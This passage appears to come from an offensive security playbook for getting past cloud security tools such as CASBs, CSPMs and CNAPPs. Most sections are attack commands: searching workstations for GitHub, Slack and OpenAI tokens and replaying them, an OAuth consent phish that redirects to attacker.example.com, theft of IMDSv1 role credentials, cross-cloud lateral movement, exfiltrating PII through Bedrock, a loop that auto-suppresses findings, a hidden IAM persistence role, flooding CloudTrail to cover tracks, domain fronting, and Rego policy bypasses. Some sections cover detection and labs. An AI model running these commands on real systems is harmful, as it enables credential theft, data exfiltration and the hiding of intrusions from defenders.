# Netskope steers traffic via SNI; SNI-less connections are not steered.
# Test with a non-standard port or via raw TCP
nc app.example.com 8443
# Or: use a domain front
curl --resolve front.example.com:443:app.example.com https://front.example.com/

# Domain-fronting effectively evades SNI-based CASB steering.
# (Many SaaS providers have deprecated domain fronting; check per-provider.)
```

---

## 9. Shadow SaaS Discovery

### 9.1 Enumerate unmanaged SaaS apps

```bash
# Look at DNS queries on a compromised corporate device to find shadow SaaS
sudo tcpdump -i any -n 'port 53' -w dns.pcap &
tcpdump -r dns.pcap -n | awk '/A\?/ {print $NF}' | sort -u | \
  grep -vE '\.(corp|internal)\.' | sort -u > saas-domains.txt

# Cross-reference against the CASB's brokered app list
# Domains NOT on the brokered list are shadow SaaS
comm -23 saas-domains.txt brokered-apps.txt > shadow-saas.txt
head -20 shadow-saas.txt
```

```bash
# Common shadow SaaS: linkedin.com, github.com, notion.so, figma.com,
# chat.openai.com, claude.ai, anthropic.com, gemini.google.com,
# pastebin.com, gist.github.com, codeshare.io

# Check for OAuth grants to these apps in the corporate tenant
# Azure AD: list OAuth2PermissionGrants
az ad sp list --query '[?appDisplayName==`LinkedIn`]' -o json
```

### 9.2 Token theft from managed apps

```bash
# Steal OAuth tokens from a managed app's storage
# Slack token: ~/.config/slack/settings.json or cookies
# GitHub token: ~/.config/gh/hosts.yml, ~/.gitconfig
# Notion: cookies in browser profile
# VS Code: ~/.vscode/settings.json, ~/.config/Code/storage.json

# Find tokens in dev workstations
find / -name '*.json' 2>/dev/null | xargs grep -lE 'ghp_|github_pat_|xox[baprs]-' 2>/dev/null
find / -name '*.env' 2>/dev/null | xargs grep -E '(OPENAI|ANTHROPIC|FIGMA|NOTION)_' 2>/dev/null

# Replay the stolen token directly against the SaaS API (no broker)
curl -H "Authorization: token ghp_REPLACED_WITH_STOLEN_TOKEN" https://api.github.com/user
curl -H "Authorization: Bearer $OPENAI_API_KEY" https://api.openai.com/v1/models
```

### 9.3 OAuth grant abuse

```bash
# An attacker-controlled OAuth app can request broad scopes on a target user.
# Once granted, the app has API access without broker intervention.

# Register an attacker app with broad scopes
# (e.g., Microsoft Graph: User.Read.All, Mail.Read, Files.Read.All)
az ad app create --display-name "calendar-sync-tool" \
  --credential-description "sync" \
  --password REPLACE_WITH_YOUR_APP_PASSWORD

# Send a phishing link to the admin-consent endpoint
ADMIN_CONSENT_URL="https://login.microsoftonline.com/common/adminconsent?client_id=REPLACE_WITH_YOUR_CLIENT_ID&redirect_uri=https://attacker.example.com/callback"

# Once an admin grants consent, the attacker app can read mail, files, etc.
# directly via Microsoft Graph -- bypassing any CASB broker because the app
# is a first-party Microsoft Graph client.
```

---

## 10. Multi-Cloud Lateral Movement Evading CSPM

### 10.1 AWS -> Azure via federation

```bash
# Steal AWS role credentials via IMDSv1
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/REPLACE_WITH_YOUR_ROLE_NAME | jq

# Use them to assume a role that federates to Azure (AWS SSO, custom OIDC)
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::REPLACE_WITH_YOUR_AWS_ACCOUNT_ID:role/AzureFederation \
  --role-session-name cross-cloud \
  --web-identity-token "$OIDC_TOKEN" \
  --provider-id REPLACE_WITH_YOUR_PROVIDER_ID

# The AWS federation is per-provider; Azure-side CSPM doesn't see the AWS source.
# An attacker moving AWS->Azure lands in Azure without AWS-side CSPM tracking
# the cross-cloud hop.
```

### 10.2 Azure -> AWS via service principal federation

```bash
# Azure AD app with federated credentials to AWS
az ad app federated-credential create --id REPLACE_WITH_YOUR_APP_ID \
  --parameters federated-cred.json

# Use the Azure AD app to get an OIDC token
az account get-access-token --resource api://REPLACE_WITH_YOUR_API | jq -r '.accessToken'

# Trade it for AWS STS credentials
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::REPLACE_WITH_YOUR_AWS_ACCOUNT_ID:role/AzureFederation \
  --role-session-name cross-cloud \
  --web-identity-token "$OIDC_TOKEN"
```

### 10.3 GCP -> AWS via Workload Identity

```bash
# GCP Workload Identity Federation to AWS
gcloud iam workload-identity-pools create-aws-provider ...

# Generate a GCP OIDC token for a service account
TOKEN=$(gcloud auth print-identity-token --audiences=//iam.googleapis.com/projects/REPLACE_WITH_YOUR_PROJECT_NUMBER/locations/global/workloadIdentityPools/REPLACE_WITH_YOUR_POOL/providers/REPLACE_WITH_YOUR_PROVIDER)

# Trade it for AWS STS credentials
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::REPLACE_WITH_YOUR_AWS_ACCOUNT_ID:role/GCPFederation \
  --role-session-name cross-cloud \
  --web-identity-token "$TOKEN"
```

### 10.4 Cross-region blind spots

```bash
# Some CSPMs are deployed per-region; resources in `us-east-1` may not be
# scanned by the CSPM deployed in `eu-west-1`.

# Identify which regions the CSPM covers
aws securityhub list-enabled-products-for-import --region us-east-1
aws securityhub list-enabled-products-for-import --region ap-east-1   # often uncovered

# Operate in the uncovered region
aws ec2 run-instances --image-id ami-REPLACE --region ap-east-1 --instance-type t3.micro
aws s3api create-bucket --bucket REPLACE_WITH_YOUR_BUCKET_NAME --region ap-east-1 --create-bucket-configuration LocationConstraint=ap-east-1

# The CSPM may not see this until the org adds ap-east-1 to its scan scope.
```

### 10.5 Cross-account via AssumeRole chain

```bash
# AssumeRole chains make CSPM tracking hard
ROLE_A=arn:aws:iam::REPLACE_WITH_YOUR_ACCOUNT_A:role/roleA
ROLE_B=arn:aws:iam::REPLACE_WITH_YOUR_ACCOUNT_B:role/roleB
ROLE_C=arn:aws:iam::REPLACE_WITH_YOUR_ACCOUNT_C:role/roleC

# A -> B
CRED_B=$(aws sts assume-role --role-arn $ROLE_A --role-session-name chain | jq '.Credentials')

# B -> C (using CRED_B)
export AWS_ACCESS_KEY_ID=$(echo $CRED_B | jq -r '.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CRED_B | jq -r '.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CRED_B | jq -r '.SessionToken')

CRED_C=$(aws sts assume-role --role-arn $ROLE_C --role-session-name chain | jq '.Credentials')

# CSPM tracking is per-account; cross-account hops with fresh sessions are
# detected only by GuardDuty (if enabled) and not by all CSPMs.
```

---

## 11. CNAPP Graph Coverage Gaps

### 11.1 Identify CNAPP graph blind spots (Wiz)

```bash
# Query the Wiz graph schema to see what entities are modelled
curl -s "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { graphSchema { entities { name categories } } }"}' \
  | jq -r '.data.graphSchema.entities[].name' | sort > wiz-entities.txt

# Newly-GA services that aren't yet in the schema
# (e.g., AWS Bedrock, AWS Q, AWS Entity Resolution -- check the schema freshness)
grep -iE 'bedrock|q_|entityresolution' wiz-entities.txt || echo "blind spot found"
```

### 11.2 Exploit a coverage gap

```bash
# Example: if AWS Bedrock is not in the Wiz schema, any data you exfil via
# a Bedrock knowledge base won't be tracked as a graph edge.

# Identify a Bedrock knowledge base
aws bedrock-agent list-knowledge-bases --region us-east-1

# Exfil data via a Bedrock query (data flow not in the CNAPP graph)
aws bedrock-agent-runtime retrieve \
  --knowledge-base-id REPLACE_WITH_YOUR_KB_ID \
  --retrieval-query '{"query": "all customer PII"}'
```

### 11.3 Prisma Cloud graph bypass

```bash
# Prisma Cloud's graph (Resource Relationships) models cloud-native entities.
# Custom resources (e.g., Lambda layers, AppSync APIs) may not be modelled.

# Identify an unmodelled resource
curl -s "$PRISMA_API_ENDPOINT/resource" \
  -H "x-redlock-auth: $PRISMA_JWT" \
  | jq '.[].resourceType' | sort -u | grep -iE 'lambda|appsync|bedrock'
```

### 11.4 Lacework polygraph bypass

```bash
# Lacework Polygraph is the runtime dependency graph.
# Resources not modelled: serverless functions, edge services.

# Enumerate the attacker's surface in polygraph
curl -s "https://REPLACE_WITH_YOUR_LACEWORK_TENANT.lacework.net/api/v2/Polygraph/Entities" \
  -H "Authorization: Bearer $LW_TOKEN" | jq '.data[].entityType' | sort -u
```

---

## 12. Defensive Detection -- Posture Audit & Suppression Hunting

### 12.1 AWS Security Hub -- audit all suppressions

```bash
# Find every SUPPRESSED finding and the user who suppressed it
aws securityhub get-findings --region us-east-1 \
  --filters 'WorkflowStatus=[{Value="SUPPRESSED",Comparison="EQUALS"}]' \
  --query 'Findings[*].[Title, AwsAccountId, RecordState, UserRecordChanges[0].UpdatedAt, UserRecordChanges[0].PrincipalId]' \
  --output text | head -50

# Cross-reference with CloudTrail `BatchUpdateFindings` events
aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=BatchUpdateFindings \
  --region us-east-1 --query 'Events[*].[EventTime, Username, CloudTrailEvent]' --output text | head -20
```

### 12.2 Prowler -- automated multi-account posture

```bash
# Prowler multi-account, multi-region scan
prowler aws -p REPLACE_WITH_YOUR_PROFILE -f us-east-1,us-west-2,eu-west-1 -M csv,json,html

# Compare with Security Hub's view -- if Prowler finds X but Security Hub
# doesn't, the difference is either a suppression or a coverage gap.
prowler aws -c check_aws_securityhub_enabled > prowler-sh.txt
```

### 12.3 OPA conformance test for IaC repos

```bash
# Run OPA in CI on every PR
opa eval -d policies/ -i input.json 'data.terraform.deny'
# Fail the build if any `deny` rule fires.
```

### 12.4 Kyverno admission audit

```bash
# Audit all Kyverno policy reports
kubectl get policyreport --all-namespaces -o json | jq '.items[].results[] | select(.result=="fail")'

# Audit Kyverno exceptions (the bypass primitive)
kubectl get exception.kyverno.io --all-namespaces
# Review each exception for scope and expiry.
```

### 12.5 Tag-tampering detection

```bash
# Set up CloudTrail alerts for tag changes on critical resources
aws logs put-metric-filter \
  --log-group-name CloudTrail/DefaultLogGroup \
  --filter-name tag-tampering \
  --filter-pattern '{$.eventName="CreateTags" && $.requestParameters.tags.0.value IN ("approved","breakglass","true")}' \
  --metric-value 1

# AWS Config rule: alert on tag changes that match suppression patterns
aws configservice put-config-rule --config-rule file://tag-tamper-rule.json
```

---

## 13. Lab Setup Recipes

### 13.1 Local AWS Security Hub + Prowler lab

```bash
# Prereq: AWS account, security hub enabled
aws securityhub enable-import-findings-for-product \
  --product-arn arn:aws:securityhub:us-east-1:REPLACE_WITH_YOUR_ACCOUNT:product/default/default

# Run Prowler, push findings to Security Hub
prowler aws -p default -M json -o /tmp/prowler-out/ -F prowler
# (Prowler's `--security-hub` flag pushes findings directly)

# Verify findings are in Security Hub
aws securityhub get-findings --filters 'ProductName=[{Value="Prowler",Comparison="EQUALS"}]' --query 'Findings[*].Title' --output text | head -10
```

### 13.2 Mock CASB proxy with mitmproxy

```bash
# Start mitmproxy as a CASB-like TLS terminator
mitmweb --mode reverse:https://app.example.com --listen-port 8443 --web-port 8081 --ssl-insecure

# Configure a client to use the proxy
curl --proxy http://127.0.0.1:8080 https://app.example.com/api/v1/files

# Inspect the intercepted traffic in the mitmweb UI at http://127.0.0.1:8081
# This emulates what a corporate CASB sees.
```

### 13.3 Mock Wiz GraphQL API

```bash
# Stand up a mock GraphQL endpoint that emulates Wiz's API
# (use Apollo Server or graphql-server)
git clone https://github.com/example/mock-wiz-api
cd mock-wiz-api && npm install && npm start
# Mock endpoint: http://127.0.0.1:4000/graphql

# Test self-reconnaissance queries
curl -s http://127.0.0.1:4000/graphql \
  -H 'Content-Type: application/json' \
  --data '{"query":"query { assets(first: 10) { nodes { id name type } } }"}' | jq
```

### 13.4 IaC drift lab

```bash
# Spin up a Terraform state file lab
mkdir tfstate-lab && cd tfstate-lab
cat > main.tf <<'EOF'
resource "aws_s3_bucket" "lab" {
  bucket = "REPLACE_WITH_YOUR_BUCKET_NAME"
  acl    = "private"
}
EOF

terraform init
terraform apply -auto-approve

# Modify the state file to inject drift (see §5.4)
# Verify `terraform plan` detects the drift
terraform plan
```

---

## 14. Real-Incident Reconstruction

### 14.1 Capital One Breach (2019) -- Security Hub coverage gap

```bash
# Capital One: SSRF -> IMDSv1 -> role creds -> S3 listing.
# At the time, Security Hub had enabled controls but the operator didn't
# act on the alerts. The bypass was *alert fatigue* + *insufficient severity*.

# Reproduce the IMDSv1 SSRF in a lab
curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/  # IMDSv1 (deprecated)
# Then via SSRF (Ruby Net::HTTP or similar):
# payload = "http://169.254.169.254/latest/meta-data/iam/security-credentials/REPLACE_WITH_YOUR_ROLE_NAME"

# Detection: enable IMDSv2 + Security Hub control `EC2.11` (no IMDSv1)
aws securityhub get-enabled-standards
aws ec2 modify-instance-metadata-options --instance-id REPLACE_WITH_YOUR_INSTANCE_ID \
  --http-tokens required --http-endpoint enabled
```

### 14.2 Tesla AWS S3 (2018) -- no MFA on console

```bash
# Tesla's Kubernetes console had no auth; attacker gained pod access,
# stole AWS creds from the pod environment, and accessed Tesla's S3 buckets
# for crypto-mining data exfil.

# Detection: Kubernetes CSPM (Kubescape) control `C-0053` (no anonymous auth)
kubescape scan framework nsa --control C-0053

# Cloud-side: GuardDuty finding `UnauthorizedAccess:EC2/TorClient` or
# `Discovery:S3/MaliciousIPCaller`
```

### 14.3 Microsoft SAS token leak (2020) -- Wiz research

```bash
# Wiz disclosed that Microsoft's Bing search app exposed a SAS token
# granting read/write to an Azure Storage blob containing user data.

# Reproduce the SAS-token exfil in a lab
# Generate a SAS token with overly-broad permissions
SAS=$(az storage blob generate-sas \
  --account-name REPLACE_WITH_YOUR_STORAGE_ACCOUNT \
  --container-name REPLACE_WITH_YOUR_CONTAINER \
  --name REPLACE_WITH_YOUR_BLOB \
  --permissions acdrw \
  --expiry 2030-01-01T00:00:00Z \
  --https-only \
  -o tsv)

# The SAS URL works without any auth (anyone with the URL can access)
curl "https://REPLACE_WITH_YOUR_STORAGE_ACCOUNT.blob.core.windows.net/REPLACE_WITH_YOUR_CONTAINER/REPLACE_WITH_YOUR_BLOB?$SAS"

# Detection: Azure Monitor alert on SAS token creation with broad permissions
az monitor activity-log list --resource-group REPLACE_WITH_YOUR_RG \
  --query "[?operationName.value=='Microsoft.Storage/storageAccounts/blobServices/generateUserDelegationKey']"
```

### 14.4 Optus Breach (2022) -- CSPM scope gap

```bash
# Optus: an unauthenticated API exposed PII of 10M customers.
# The CSPM didn't flag the API as exposed because:
#   (a) it was behind an API Gateway (not flagged as public)
#   (b) the API's authN was misconfigured (permissive)
#   (c) the CSPM didn't model the API Gateway -> Lambda -> DB data flow

# Detection: a CNAPP that models API Gateway + Lambda data flows would have
# flagged this. AWS WAF + API Gateway authN enforcement closes the gap.
aws apigateway get-rest-apis --region us-east-1 | jq '.items[] | {id, name}'
aws apigateway get-authorizers --rest-api-id REPLACE_WITH_YOUR_API_ID
```

### 14.5 ICBC Ransomware (2023) -- CSPM alerting failure

```bash
# ICBC Financial Services hit by LockBit 3.0 in November 2023.
# The attack exploited a Citrix Bleed (CVE-2023-4966) vulnerability.
# The CSPM reportedly failed to alert on the unpatched Citrix server
# because it was on-prem and outside the CSPM's cloud scope.

# Detection: extend posture management to on-prem via a CNAPP agent
# (Prisma Cloud Compute Defender, Wiz runtime sensor, Lacework agent)
# OR: scan Citrix CVEs directly via nuclei templates
nuclei -u https://citrix.example.com -t http/cves/2023/CVE-2023-4966.yaml
```

---

## 15. Post-Exploitation Maintenance -- Continuous Suppression

### 15.1 Automate suppression on new findings

```bash
# A loop that polls for new findings on attacker resources and suppresses them
while true; do
  FINDING_ID=$(aws securityhub get-findings --region us-east-1 \
    --filters 'ResourceTags=[{Key="attacker",Value="true",Comparison="EQUALS"}],WorkflowStatus=[{Value="NEW",Comparison="EQUALS"}]' \
    --query 'Findings[0].Id' --output text)
  if [ -n "$FINDING_ID" ] && [ "$FINDING_ID" != "None" ]; then
    PRODUCT_ARN=$(aws securityhub get-findings --region us-east-1 \
      --filters "Id=[{Value=\"$FINDING_ID\",Comparison=\"EQUALS\"}]" \
      --query 'Findings[0].ProductArn' --output text)
    aws securityhub batch-update-findings --region us-east-1 \
      --finding-identifiers Id="$FINDING_ID",ProductArn="$PRODUCT_ARN" \
      --note "auto-suppressed" --workflow Status=SUPPRESSED
    echo "suppressed: $FINDING_ID"
  fi
  sleep 300
done
```

### 15.2 Persist via IAM role with CSPM-write permissions

```bash
# Create a hidden IAM role with the minimum CSPM-write permissions
# (This requires `iam:CreateRole` -- already a high-privilege primitive.)
POLICY=$(cat <<JSON
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["securityhub:BatchUpdateFindings","securityhub:UpdateInsight","securityhub:CreateInsight"],
      "Resource": "*"
    }
  ]
}
JSON
)

aws iam create-role --role-name security-audit-helper \
  --assume-role-policy-document file://trust-policy.json
aws iam put-role-policy --role-name security-audit-helper \
  --policy-name security-hub-write --policy-document "$POLICY"

# Now any finding on attacker resources can be suppressed via this role
# without the defender noticing the suppression action came from an attacker.
```

### 15.3 Cover tracks via CloudTrail event flood

```bash
# Some attackers flood CloudTrail with high-volume low-priority events to
# drown out the suppression action in the audit log.
for i in {1..10000}; do
  aws s3 ls s3://REPLACE_WITH_YOUR_BUCKET_NAME 2>/dev/null
done
# The `BatchUpdateFindings` action is now buried in noise.
# Detection: separate CloudTrail trails for security-write events; SIFT alerts.
```

---

## 16. Per-CASB-Vendor Attack Catalogue

### 16.1 Netskope Security Cloud

```bash
# Netskope steers via client (Netskope One Client) or via PAC file.
# Client installs a root CA on the device; intercept TLS via cert pinning bypass.

# Discover the Netskope tenant API endpoint
# Format: https://<org>.goskope.com/api/v1/
NETSKOPE_API="https://REPLACE_WITH_YOUR_ORG.goskope.com"

# Authenticate (admin token from Netskope console > Settings > API Tokens)
NETSKOPE_TOKEN=REPLACE_WITH_YOUR_NETSKOPE_TOKEN

# List all brokered SaaS apps (API-connected)
curl -s "$NETSKOPE_API/api/v1/policy" \
  -H "Nsk-Version: 1.0" \
  -H "Token: $NETSKOPE_TOKEN" | jq '.data[] | select(.type=="api")'

# List all discovered SaaS (cloud provider discovery)
curl -s "$NETSKOPE_API/api/v1/discovered_apps" \
  -H "Token: $NETSKOPE_TOKEN" | jq '.data[] | {name, category, risk}'
```

```bash
# Identify Netskope on a corporate device
security find-certificate -a -c 'Netskope' 2>/dev/null  # macOS
ls /Library/Application\ Support/Netskope/ 2>/dev/null   # macOS STAgent UI
ls /opt/netskope/ 2>/dev/null                              # Linux

# The Netskope root CA is installed at:
#   macOS:  /Library/Application Support/Netskope/NSRoot.crt
#   Linux:  /opt/netskope/nsroot.crt
#   Windows: HKLM\Software\Netskope\Cert
```

```bash
# Evasion: SNI-less TCP connection (Netskope steers via SNI)
nc app.example.com 8443   # raw TCP, no SNI

# Or: domain fronting via a CDN that Netskope doesn't broker
curl --resolve front.example.com:443:app.example.com https://front.example.com/

# Netskope client log inspection (useful for understanding what's being inspected)
tail -f /Library/Application\ Support/Netskope/stAgentUI.log 2>/dev/null
```

### 16.2 Zscaler CASB / ZTNA

```bash
# Zscaler ZTNA tunnels forward traffic via a PAC file
# PAC file URL: https://pac.zscalerbeta.net/<PAC_ID>/zscaler.pac
curl -s https://pac.zscalerbeta.net/REPLACE_WITH_YOUR_PAC_ID/zscaler.pac | head -40

# Discover brokered apps from the PAC file
grep -oE 'https?://[^/]+' REPLACE_WITH_YOUR_PAC_FILE | sort -u > zscaler-brokered.txt

# Apps NOT in the PAC file are not brokered -- use them for exfil
comm -23 saas-domains.txt zscaler-brokered.txt > zscaler-bypass-targets.txt
head -20 zscaler-bypass-targets.txt
```

```bash
# Zscaler Private Access (ZPA) -- inspect the Zscaler app connector
# ZPA forwards traffic to internal apps; the connector runs on a Linux VM.
# Compromise the connector VM -> forward arbitrary internal traffic.

# Connector enumeration (post-compromise)
sudo systemctl status zpa-connector
sudo cat /opt/zscaler/var/zpa_connector.log | head -50
```

```bash
# Zscaler Internet Access (ZIA) -- forward proxy
# Identify ZIA via the tunnel interface
scutil --nwi 2>/dev/null | grep -i zscaler  # macOS
ip route | grep -i zscaler                   # Linux

# Evasion: ZIA follows PAC; bypass by overriding PAC in the client config
# Or: route via a non-standard port (ZIA may only forward 80/443)
curl -v https://app.example.com:8443/api/v1/data
```

### 16.3 Microsoft Defender for Cloud Apps (formerly MCAS)

```bash
# Conditional Access app control (CAAC) wraps SaaS apps with *.mcas.ms CNAMEs
dig +short app.example.com
# Returns: example.com.mcas.ms

# Identify the tenant
curl -s "https://app.example.com.mcas.ms" | grep -oE 'tenant=[a-f0-9-]+'

# Defender for Cloud Apps API
MDC_TOKEN=REPLACE_WITH_YOUR_MDC_TOKEN
curl -s "https://REPLACE_WITH_YOUR_TENANT.portal.cloudappsecurity.com/api/v1/discovered_apps/" \
  -H "Authorization: Token $MDC_TOKEN" | jq '.[].name'

# List activity log (brokered SaaS access events)
curl -s "https://REPLACE_WITH_YOUR_TENANT.portal.cloudappsecurity.com/api/v1/activities/" \
  -H "Authorization: Token $MDC_TOKEN" | jq '.data | length'
```

```bash
# CAAC bypass: the brokered URL app.example.com.mcas.ms proxies to app.example.com
# Direct call to app.example.com bypasses the broker
# Detection: Microsoft 365 logs API access by source IP; alert on non-broker IPs.

# Find the real IP of the SaaS app (behind the *.mcas.ms proxy)
dig +short app.example.com A   # skip the CNAME to mcas.ms
# Or: query the SaaS provider's API documentation for the direct endpoint

# Direct call (bypass broker)
curl -H "Authorization: Bearer $SAAS_JWT" https://app.example.com/api/v1/files
```

### 16.4 Skyhigh Security (formerly McAfee / Trellix MVISION Cloud)

```bash
# Skyhigh CASB runs as a forward proxy with a REST API
SKYHIGH_API="https://REPLACE_WITH_YOUR_TENANT.skyhighcloud.com"

# Authenticate
SKYHIGH_TOKEN=$(curl -s -X POST "$SKYHIGH_API/shnapi/rest/login" \
  --data-urlencode "username=REPLACE_WITH_YOUR_USER" \
  --data-urlencode "password=REPLACE_WITH_YOUR_PASSWORD" | jq -r '.token')

# List discovered SaaS
curl -s "$SKYHIGH_API/shnapi/rest/api/v1/discover/services" \
  -H "Auth-Token: $SKYHIGH_TOKEN" | jq '.[].serviceName'

# List policy violations (DLP events)
curl -s "$SKYHIGH_API/shnapi/rest/api/v1/policy/violations" \
  -H "Auth-Token: $SKYHIGH_TOKEN" | jq '.[] | {policyName, severity}'
```

```bash
# Skyhigh uses SECURELINK reverse proxy -- apps accessed via a portal URL
# Evasion: identify the underlying SaaS API and call directly

# Identify Skyhigh on a corporate device
ls /Library/McAfee/ 2>/dev/null       # macOS
ls /opt/McAfee/ 2>/dev/null           # Linux
```

### 16.5 Symantec CloudSOC (Broadcom)

```bash
# CloudSOC uses an Investigate API and a CASB gateway
CLOUDSOC_API="https://REPLACE_WITH_YOUR_TENANT.elasticemail.com"  # placeholder

# Authenticate via JWT
CLOUDSOC_JWT=$(curl -s -X POST "$CLOUDSOC_API/api/v1/auth" \
  --data-urlencode "username=REPLACE_WITH_YOUR_USER" \
  --data-urlencode "password=REPLACE_WITH_YOUR_PASSWORD" | jq -r '.token')

# List discovered SaaS apps
curl -s "$CLOUDSOC_API/api/v1/discovered_apps" \
  -H "Authorization: Bearer $CLOUDSOC_JWT" | jq '.[] | .name'

# List DLP incidents
curl -s "$CLOUDSOC_API/api/v1/incidents" \
  -H "Authorization: Bearer $CLOUDSOC_JWT" | jq '.[] | {policy, severity}'
```

### 16.6 Trellix MVISION Cloud (formerly McAfee)

```bash
# MVISION Cloud API endpoint
MVISION_API="https://REPLACE_WITH_YOUR_TENANT.mvisioncloud.com"

# Authenticate
MVISION_TOKEN=$(curl -s -X POST "$MVISION_API/identity/v1/login" \
  -H 'Content-Type: application/json' \
  --data '{"username":"REPLACE_WITH_YOUR_USER","password":"REPLACE_WITH_YOUR_PASSWORD"}' \
  | jq -r '.token')

# List policies
curl -s "$MVISION_API/policy/v1/policies" \
  -H "Authorization: Bearer $MVISION_TOKEN" | jq '.[] | .name'

# List incidents
curl -s "$MVISION_API/incidents/v1/incidents" \
  -H "Authorization: Bearer $MVISION_TOKEN" | jq '.[] | .description'
```

---

## 17. Per-CNAPP-Vendor Specifics

### 17.1 Wiz -- graph queries and suppression rules

```bash
# Wiz's GraphQL API is the primary interface
# Endpoint: $WIZ_ENDPOINT/graphql (e.g., https://api.eu.app.wiz.io/graphql)

# Suppress a finding via API (Wiz calls this "ignore rule")
curl -s -X POST "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{
    "query": "mutation CreateIgnoreRule($input: CreateIgnoreRuleInput!) { createIgnoreRule(input: $input) { ignoreRule { id name } } }",
    "variables": {
      "input": {
        "name": "suppress-non-issue",
        "reason": "investigated",
        "filters": {"type": "FINDING_TYPE", "values": ["MISCONFIGURATION"]},
        "match": {"cloudAccount": ["REPLACE_WITH_YOUR_ACCOUNT_ID"]}
      }
    }
  }' | jq
```

```bash
# Query the graph to find an attack path
curl -s -X POST "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{
    "query": "query($filter: AssetFilter) { assets(filter: $filter) { nodes { id name type graphEntity { cloudPlatform findings { title severity } } } } }",
    "variables": {
      "filter": {"type": ["VIRTUAL_MACHINE"], "cloudPlatform": ["AWS"]}
    }
  }' | jq '.data.assets.nodes[0]'
```

```bash
# List all attack paths (the kill-chain findings)
curl -s -X POST "$WIZ_ENDPOINT/graphql" \
  -H "Authorization: Bearer $WIZ_JWT" \
  -H 'Content-Type: application/json' \
  --data '{"query":"{ attackPaths(first: 50) { nodes { id name riskScore } } }"}' \
  | jq '.data.attackPaths.nodes[]'
```

### 17.2 Prisma Cloud -- RQL queries and dismissal

```bash
# RQL: Prisma's query language for the resource graph
# Example: find all public S3 buckets
curl -s -X POST "$PRISMA_API_ENDPOINT/search/config" \
  -H "x-redlock-auth: $PRISMA_JWT" \
  -H 'Content-Type: application/json' \
  --data '{
    "withResourceIds": true,
    "timeRange": {"type": "relative", "value": {"amount": "7", "unit": "day"}},
    "query": "config from cloud.resource where cloud.type = '\''aws'\'' AND api.name = '\''aws-s3api-get-bucket-acl'\'' AND acl.grants = '\''ALL_USERS'\''",
    "limit": 100
  }' | jq '.data.items[]'

# RQL: find EC2 instances with admin permissions
curl -s -X POST "$PRISMA_API_ENDPOINT/search/config" \
  -H "x-redlock-auth: $PRISMA_JWT" \
  -H 'Content-Type: application/json' \
  --data '{
    "query": "config from cloud.resource where cloud.type = '\''aws'\'' AND api.name = '\''aws-iam-get-role-policy'\'' AND json.rule = '\''policyDocument.*.statement.*.action contains ec2:*'\''"
  }' | jq
```

```bash
# RQL injection (theoretical): older Prisma versions accepted unescaped RQL
# fragments via API parameters. Always sanitize user input.
# Test in a lab: send a query with single quotes and observe the response.
```

### 17.3 Lacework -- polygraph queries

```bash
# Polygraph entity query
curl -s "https://REPLACE_WITH_YOUR_TENANT.lacework.net/api/v2/Polygraph/Entities?entityType=AWS_EC2_INSTANCE" \
  -H "Authorization: Bearer $LW_TOKEN" | jq '.data[] | {name, machineId, region}'

# List all active alerts
curl -s "https://REPLACE_WITH_YOUR_TENANT.lacework.net/api/v2/Alerts?status=OPEN" \
  -H "Authorization: Bearer $LW_TOKEN" | jq '.data[] | {alertId, severity, title}'
```

### 17.4 Orca Security -- API queries

```bash
# Orca uses a REST API; first authenticate
ORCA_TOKEN=$(curl -s -X POST "https://REPLACE_WITH_YOUR_TENANT.orcasecurity.io/api/user/auth" \
  --data-urlencode "email=REPLACE_WITH_YOUR_EMAIL" \
  --data-urlencode "password=REPLACE_WITH_YOUR_PASSWORD" | jq -r '.token')

# List all alerts
curl -s "https://REPLACE_WITH_YOUR_TENANT.orcasecurity.io/api/alerts?state=open" \
  -H "Authorization: Bearer $ORCA_TOKEN" | jq '.data[] | {alertId, severity, type}'

# Suppress an alert
curl -s -X POST "https://REPLACE_WITH_YOUR_TENANT.orcasecurity.io/api/alerts/REPLACE_WITH_YOUR_ALERT_ID/dismiss" \
  -H "Authorization: Bearer $ORCA_TOKEN" | jq
```

### 17.5 Sysdig Secure -- posture and runtime

```bash
# Sysdig Secure API
SYSDIG_TOKEN=REPLACE_WITH_YOUR_SYSDIG_TOKEN

# List posture findings
curl -s "https://REPLACE_WITH_YOUR_TENANT.sysdig.com/api/v1/posture/findings" \
  -H "Authorization: Bearer $SYSDIG_TOKEN" | jq '.data[] | {severity, controlName}'

# List runtime policies
curl -s "https://REPLACE_WITH_YOUR_TENANT.sysdig.com/api/v1/runtime/policies" \
  -H "Authorization: Bearer $SYSDIG_TOKEN" | jq '.policies[] | {name, enabled}'
```

### 17.6 AWS Security Hub -- custom insights

```bash
# Custom insight: filter for resources tagged "attacker"
aws securityhub create-insight --region us-east-1 \
  --name "attacker-tracking" \
  --filters 'ResourceTags=[{Key="attacker",Value="true",Comparison="EQUALS"}]' \
  --group-by-attribute 'RuleId'

# Custom insight: HIGH-severity findings in non-production accounts
aws securityhub create-insight --region us-east-1 \
  --name "high-sev-nonprod" \
  --filters 'SeverityLabel=[{Value="HIGH",Comparison="EQUALS"},{Value="CRITICAL",Comparison="EQUALS"}]' \
  --group-by-attribute 'AwsAccountId'
```

---

## 18. OPA / Kyverno Deep Dive

### 18.1 OPA Rego -- common bypass patterns

```rego
# Bypass 1: Case-sensitive equality match
package terraform.deny

deny[msg] {
  some r
  r = input.resource.aws_s3_bucket[_]
  r.acl == "public-read"   # case-sensitive!
  msg = sprintf("S3 bucket %s is public", [r.name])
}
# Bypass: set acl to "Public-Read" (capital P) -- the match fails.
```

```rego
# Bypass 2: Missing negation
package terraform.deny

deny[msg] {
  some r
  r = input.resource.aws_s3_bucket[_]
  not r.versioning.enabled   # missing: what if versioning is undefined?
  msg = sprintf("S3 bucket %s has no versioning", [r.name])
}
# Bypass: omit the versioning block entirely; `not r.versioning.enabled`
